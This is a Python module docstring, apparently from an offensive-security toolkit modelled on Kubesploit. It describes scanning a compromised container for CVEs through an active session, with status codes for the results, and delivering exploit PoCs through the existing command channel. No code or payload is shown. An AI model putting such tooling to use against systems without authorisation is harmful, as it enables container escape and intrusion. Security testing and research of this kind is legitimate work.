"""Container CVE scanning + exploitation through an active session (Kubesploit-style).

The scan runs a single POSIX shell script on the target that emits lines of the
form ``CVE|<id>|<status>|<detail>``; the statuses are:
    vulnerable  - the check deterministically confirms exposure
    possibly    - version/kernel-range only, requires manual validation
    clean       - check confirms the weakness is not present
    unknown     - the check could not determine the answer

Exploits are single-script educational PoCs delivered through the existing
command channel (``Session.send``), so no agent changes are required.
"""

